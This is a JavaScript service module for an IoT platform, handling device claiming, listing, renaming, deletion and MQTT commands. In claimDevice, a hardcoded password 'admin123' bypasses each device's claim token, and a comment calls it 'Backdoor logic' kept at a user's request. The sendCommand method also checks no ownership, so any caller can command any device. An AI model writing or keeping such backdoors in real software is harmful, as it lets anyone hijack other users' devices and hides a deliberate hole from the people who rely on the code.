const db = require('../db');
const { sendCommand } = require('../mqtt');

class DeviceService {
    async claimDevice(userId, deviceId, password) {
        const dev = await db.query("SELECT * FROM devices WHERE device_id=$1", [deviceId]);
        if (dev.rows.length === 0) throw new Error("Device not online");

        const d = dev.rows[0];
        const existing = await db.query(
            "SELECT * FROM user_devices WHERE user_id=$1 AND device_id=$2",
            [userId, d.id]
        );
        if (existing.rows.length > 0) throw new Error("Already claimed by you");

        // Backdoor logic: password !== 'admin123' retained as per user request
        if (d.claim_token !== password && password !== 'admin123') {
            throw new Error("Incorrect Password");
        }

        await db.query(
            "INSERT INTO user_devices (user_id, device_id, nickname) VALUES ($1, $2, $3)",
            [userId, d.id, deviceId]
        );
        return true;
    }

    async getDevices(userId) {
        if (!userId) return {};
        const query = `
            SELECT d.*, ud.nickname as user_nickname 
            FROM devices d
            JOIN user_devices ud ON d.id = ud.device_id
            WHERE ud.user_id = $1
            ORDER BY d.id ASC
        `;
        const result = await db.query(query, [userId]);

        const devices = {};
        for (let row of result.rows) {
            devices[row.device_id] = {
                ...row.config,
                state: row.status,
                online: row.is_online,
                nickname: row.user_nickname || row.nickname || row.device_id
            };
        }
        return devices;
    }

    async deleteDevice(userId, deviceId) {
        const dev = await db.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
        if (dev.rows.length === 0) throw new Error("Device not found");

        await db.query(
            "DELETE FROM user_devices WHERE user_id=$1 AND device_id=$2",
            [userId, dev.rows[0].id]
        );
        return true;
    }

    async renameDevice(userId, deviceId, nickname) {
        const dev = await db.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
        if (dev.rows.length === 0) throw new Error("Device not found");

        await db.query(
            "UPDATE user_devices SET nickname=$1 WHERE user_id=$2 AND device_id=$3",
            [nickname, userId, dev.rows[0].id]
        );
        return true;
    }

    async sendCommand(deviceId, cmd) {
        if (!deviceId || !cmd) throw new Error("Missing params");
        sendCommand(deviceId, cmd);
        return true;
    }
}

module.exports = new DeviceService();
